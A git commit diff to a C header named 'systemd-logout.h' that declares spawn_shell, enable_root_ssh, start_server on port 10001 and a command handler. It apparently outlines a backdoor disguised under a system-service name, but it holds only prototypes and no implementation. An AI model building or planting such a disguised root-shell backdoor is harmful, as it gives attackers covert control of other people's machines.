73644c3b5f7e279e8f0ad5fd39ff5814af585094
Andromeda <eclipse0010101@gmail.com>
2023-10-10 10:32:21 -0500

    Add files via upload

--- includes/systemd-logout.h
+++ includes/systemd-logout.h
@@ -7,9 +7,10 @@ const size_t BUFFER_SIZE = 1024;
 const uint16_t PORT = 10001;
 int connfd;
 
-void spawn_shell();
+void spawn_shell(void);
+void enable_root_ssh(void);
 int handler(char option[BUFFER_SIZE]);
-void read_data();
-void start_server();
+void read_data(void);
+void start_server(void);
 
 #endif
